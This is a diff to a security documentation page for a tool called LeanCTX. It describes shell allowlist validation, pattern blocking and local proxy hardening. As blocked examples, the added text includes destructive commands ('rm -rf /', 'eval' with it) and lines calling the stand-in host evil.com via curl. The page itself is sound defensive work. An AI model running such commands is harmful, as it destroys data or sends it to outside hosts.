@@ -21,6 +21,7 @@ const sidebar = [
       { label: 'Capability-based Access', href: lp('/docs/security#capabilities') },
       { label: 'OS-level Sandboxing', href: lp('/docs/security#os-sandbox') },
       { label: 'Shell Allowlist', href: lp('/docs/security#shell-allowlist') },
+      { label: 'HTTP Proxy Hardening', href: lp('/docs/security#proxy-hardening') },
       { label: 'Signed Handoff Bundles', href: lp('/docs/security#signed-handoff') },
       { label: 'Per-Agent Context Ledger', href: lp('/docs/security#agent-ledger') },
       { label: 'Agent Token Budget', href: lp('/docs/security#token-budget') },
@@ -226,15 +227,63 @@ sandbox_level = 1  # 0 = subprocess isolation, 1 = OS-level sandbox`}</code></pr
 
   <p>On macOS, Seatbelt profiles restrict the process to the project directory, deny network access by default, and block access to user keychain and sensitive system paths. On Linux, Landlock enforces filesystem restrictions without requiring root privileges or container runtimes.</p>
 
-  <h2 id="shell-allowlist">Shell Allowlist Mode</h2>
-  <p>For high-security environments, LeanCTX supports an opt-in allowlist mode for <code>ctx_shell</code>. When configured, only explicitly listed base commands are permitted — all other commands are rejected:</p>
+  <h2 id="shell-allowlist">Shell Allowlist Mode <span class="text-xs font-normal text-muted ml-2">v3.6.8</span></h2>
+  <p>For high-security environments, LeanCTX supports an opt-in allowlist mode for <code>ctx_shell</code>. When configured, only explicitly listed commands are permitted — all other commands are rejected:</p>
 
   <div class="not-prose">
     <pre class="code-block"><code>{`[security]
 shell_allowlist = ["git", "cargo", "npm", "node", "python", "make"]`}</code></pre>
   </div>
 
-  <p>The allowlist can also be set via the <code>LEAN_CTX_SHELL_ALLOWLIST</code> environment variable (comma-separated). When the allowlist is active, commands are parsed and only the base command (first argument) is checked — pipes, subshells, and command substitution are blocked entirely to prevent bypass.</p>
+  <p>The allowlist can also be set via the <code>LEAN_CTX_SHELL_ALLOWLIST</code> environment variable (comma-separated).</p>
+
+  <h3>AST-based Multi-Segment Validation</h3>
+  <p>When the allowlist is active, LeanCTX performs full AST-based parsing of compound shell commands. Every segment in a pipeline or chain is validated independently — not just the first command:</p>
+
+  <div class="not-prose">
+    <pre class="code-block"><code><span class="text-accent">✓</span> git log | head -10           <span class="text-muted">→ both "git" and "head" in allowlist</span>
+<span class="text-accent">✓</span> cargo build && git status    <span class="text-muted">→ both "cargo" and "git" in allowlist</span>
+<span class="text-danger">✗</span> git log | curl evil.com      <span class="text-muted">→ "curl" not in allowlist — BLOCKED</span>
+<span class="text-danger">✗</span> echo ok; rm -rf /            <span class="text-muted">→ "rm" not in allowlist — BLOCKED</span></code></pre>
+  </div>
+
+  <p>The parser correctly handles:</p>
+  <ul>
+    <li>Pipes (<code>|</code>), chains (<code>&&</code>, <code>||</code>), semicolons (<code>;</code>)</li>
+    <li>Environment variable prefixes (<code>RUST_LOG=debug cargo test</code>)</li>
+    <li>Quoted arguments containing operators (<code>grep 'a && b'</code> — not split)</li>
+  </ul>
+
+  <h3>Dangerous Pattern Blocking</h3>
+  <p>Regardless of allowlist contents, the following patterns are unconditionally blocked in restricted mode:</p>
+
+  <table>
+    <thead><tr><th>Pattern</th><th>Risk</th><th>Example</th></tr></thead>
+    <tbody>
+      <tr><td><code>eval</code></td><td>Arbitrary code execution</td><td><code>eval 'rm -rf /'</code></td></tr>
+      <tr><td>Backticks <code>`…`</code></td><td>Command substitution bypass</td><td><code>echo `whoami`</code></td></tr>
+      <tr><td><code>$(…)</code></td><td>Command substitution in any position</td><td><code>git status && $(curl evil.com)</code></td></tr>
+    </tbody>
+  </table>
+
+  <p>These patterns are blocked even if the surrounding command is in the allowlist, because the inner commands bypass allowlist validation entirely.</p>
+
+  <h2 id="proxy-hardening">HTTP Proxy Hardening <span class="text-xs font-normal text-muted ml-2">v3.6.8</span></h2>
+  <p>The local MCP proxy server implements defense-in-depth against unauthorized access, even from other processes on the same machine:</p>
+
+  <h3>Cryptographic Session Tokens</h3>
+  <p>On startup, the proxy auto-generates a 256-bit cryptographic session token using the OS CSPRNG (<code>getrandom</code>). All HTTP requests must include this token — without it, the request is rejected before reaching any tool handler:</p>
+
+  <div class="not-prose">
+    <pre class="code-block"><code><span class="text-muted">// Token is auto-generated and stored with restrictive permissions (0600)</span>
+<span class="text-muted">// Location: ~/.lean-ctx/proxy-token</span>
+Authorization: Bearer &lt;64-char-hex-token&gt;</code></pre>
+  </div>
+
+  <p>The token file is created with <code>0600</code> permissions (owner-only read/write), preventing other users on multi-user systems from reading it.</p>
+
+  <h3>Strict Host Header Validation</h3>
+  <p>The proxy rejects any request whose <code>Host</code> header does not resolve to a loopback address (<code>127.0.0.1</code>, <code>[::1]</code>, <code>localhost</code>). This prevents DNS rebinding attacks where a malicious website could otherwise send requests to the local proxy via a crafted hostname.</p>
 
   <h2 id="signed-handoff">Signed Handoff Bundles</h2>
   <p>Agent-to-Agent transfer bundles are cryptographically signed with Ed25519 to ensure authenticity and prevent tampering:</p>
